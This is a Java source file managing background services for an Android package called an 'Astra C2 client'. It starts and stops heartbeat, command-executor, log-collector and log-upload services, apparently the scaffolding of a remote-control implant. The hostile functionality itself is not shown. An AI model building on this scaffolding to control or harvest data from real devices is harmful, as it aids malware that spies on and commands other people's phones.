package com.astra.c2client;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

public class ServiceManager {
    private static final String TAG = "AstraC2-ServiceMgr";
    
    /**
     * Start all the services required for Astra C2 client
     * 
     * @param context The application context
     */
    public static void startAllServices(Context context) {
        Log.d(TAG, "Starting all services");
        
        // Start heartbeat service
        Intent heartbeatIntent = new Intent(context, HeartbeatService.class);
        startService(context, heartbeatIntent, HeartbeatService.class.getName());
        
        // Start command executor service
        Intent commandIntent = new Intent(context, CommandExecutorService.class);
        startService(context, commandIntent, CommandExecutorService.class.getName());
        
        // Start log collector service
        Intent logCollectorIntent = new Intent(context, LogCollectorService.class);
        startService(context, logCollectorIntent, LogCollectorService.class.getName());
        
        // Start log upload service
        Intent logUploadIntent = new Intent(context, LogUploadService.class);
        startService(context, logUploadIntent, LogUploadService.class.getName());
    }
    
    /**
     * Stop all the services used by Astra C2 client
     * 
     * @param context The application context
     */
    public static void stopAllServices(Context context) {
        Log.d(TAG, "Stopping all services");
        
        // Stop heartbeat service
        Intent heartbeatIntent = new Intent(context, HeartbeatService.class);
        context.stopService(heartbeatIntent);
        
        // Stop command executor service
        Intent commandIntent = new Intent(context, CommandExecutorService.class);
        context.stopService(commandIntent);
        
        // Stop log collector service
        Intent logCollectorIntent = new Intent(context, LogCollectorService.class);
        context.stopService(logCollectorIntent);
        
        // Stop log upload service
        Intent logUploadIntent = new Intent(context, LogUploadService.class);
        context.stopService(logUploadIntent);
    }
    
    /**
     * Start a service with compatibility for different Android versions
     * 
     * @param context The application context
     * @param intent The service intent
     * @param serviceName The name of the service for logging
     */
    private static void startService(Context context, Intent intent, String serviceName) {
        if (isServiceRunning(context, serviceName)) {
            Log.d(TAG, serviceName + " already running");
            return;
        }
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
            Log.d(TAG, "Started " + serviceName);
        } catch (Exception e) {
            Log.e(TAG, "Failed to start " + serviceName, e);
        }
    }
    
    /**
     * Check if a service is already running
     * 
     * @param context The application context
     * @param serviceName The class name of the service
     * @return True if the service is running, false otherwise
     */
    private static boolean isServiceRunning(Context context, String serviceName) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceName.equals(service.service.getClassName())) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Get a list of all running services for the app
     * 
     * @param context The application context
     * @return A list of running service names
     */
    public static List<String> getRunningServices(Context context) {
        List<String> runningServices = new ArrayList<>();
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            String className = service.service.getClassName();
            if (className.startsWith("com.astra.c2client")) {
                runningServices.add(className);
            }
        }
        
        return runningServices;
    }
}
